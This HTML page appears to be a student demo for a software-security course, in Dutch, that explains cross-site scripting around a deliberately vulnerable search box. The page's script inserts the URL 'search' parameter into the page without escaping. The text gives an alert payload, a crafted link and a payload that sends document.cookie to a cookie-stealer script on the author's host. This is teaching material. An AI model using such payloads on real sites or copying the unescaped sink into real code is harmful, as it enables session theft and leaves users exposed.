
<html>
<!DOCTYPE html>
<head>
	<meta charset="utf-8" />
	<title>NWC - Search</title>
	<!-- jquery -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<!-- Latest compiled and minified CSS -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
	<!-- Optional theme -->
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

</head>
<body>
	<nav class="navbar navbar-default">
		<div class="container-fluid">
			<!-- Brand and toggle get grouped for better mobile display -->
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
					<span class="sr-only">Toggle navigation</span>
				</button>
				<a class="navbar-brand" href="index.php">Software Security</a>
			</div>

			<!-- Collect the nav links, forms, and other content for toggling -->
			<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
				<ul class="nav navbar-nav">
					<li class="dropdown">
						<a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Opdracht Onderdelen <span class="caret"></span></a>
						<ul class="dropdown-menu">
							<li><a href="XSS.php">XSS</a></li>
							<li role="separator" class="divider"></li>
							<li><a href="HTTPResponseSplitting.php">HTTP Response Splitting</a></li>
							<li role="separator" class="divider"></li>
							<li><a href="Cross-SiteRequestForgery.php">Cross-Site Request Forgery</a></li>
							<li role="separator" class="divider"></li>
							<li><a href="SQLInjectie.php">SQL Injectie</a></li>
						</ul>
					</li>
				</ul>
			</div>
		</div>
	</nav>
<div class="row">
    <div class="col-sm-1"></div>
    <div class="col-sm-3">
	Search: <input id='search' type='text' size='50' class="form-control"><br/>

	<button onclick='searchOutput()' class="btn btn-primary">OK</button><br/></br>
	<div class="panel panel-info">
	    <div class="panel-heading">
	        <h3 class="panel-title">Output</h3>
	        </div>
	        <div class="panel-body">
	<div id='output'></div>
    </div>
    </div>
	</div>
	<div class="col-sm-6">
    </br>
    <div class="panel panel-info">
        <div class="panel-heading">
    <h3 class="panel-title">Cross-Site Scripting</h3>
  </div>
  <div class="panel-body">
    <p>
        Cross-Site Scripting gebeurd wanneer je een input veld voorziet voor de gebruiker, en hetgeen ingevoerd wordt zonder filtering op de pagina toont.</br></br>
        Als je in de search bar een tekst schrijft zal deze letterlijk terruggekaatst worden op de webpagina.</br></br>
        
        Maar het wordt pas echt leuk als we er javascript invoeren.</br>
        Voer het volgende bijvoorbeeld eens in:</br></br>
        
        &lt;script&gt;alert(&quot;Here's Johnny!&quot;)&lt;/script&gt;</br></br>
        Dit is een voorbeeld van XSS type 1.</br></br>
        Voor DOM0 moeten we de code invoeren in de url. Volg bijvoorbeeld volgende link eens:</br></br>
        http://silke-henderickx-software-security.000webhostapp.com/XSS.php?search=&lt;script&gt;alert(&quot;Here's Johnny!&quot;)&lt;/script&gt;</br></br>
        
        Een echte hacker gaat natuurlijk niet met alertjes werken. Voer het volgende eens in de search bar in:</br></br>
        &lt;script language=&quot;javascript&quot;&gt;document.location=&quot;https://silke-henderickx-software-security.000webhostapp.com/cookiestealer.php?c=&quot;%2Bdocument.cookie;&lt;/script&gt; </br></br>
        (Een echte hacker zou dit natuurlijk ook encoden zodat het niet obvious is wat er gaat gebeuren...)
        
    </p>
  </div>
        
</div>
    
</div>
	<br>
	</div>
</div>
 <script>
function searchOutput(){
	var search= $("#search").val();
	 window.location = window.location.href.split('?')[0] + '?search=' + search;
}

var url_string = window.location.href;
var url = new URL(url_string);

var search = url.searchParams.get("search");


$('#output').html(search);

</script>

